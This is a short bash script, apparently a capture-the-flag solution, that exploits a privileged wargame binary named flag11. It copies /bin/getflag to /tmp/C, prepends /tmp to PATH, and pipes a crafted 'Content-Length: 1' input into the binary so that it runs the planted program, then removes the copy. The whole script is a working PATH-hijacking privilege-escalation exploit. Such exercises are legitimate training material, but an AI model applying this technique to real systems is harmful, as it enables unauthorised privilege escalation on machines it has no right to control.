#!/usr/bin/env bash

cp -f /bin/getflag /tmp/C

echo -e -n "Content-Length: 1\nB" | \
    PATH="/tmp:$PATH" /home/flag11/flag11

rm -f /tmp/C
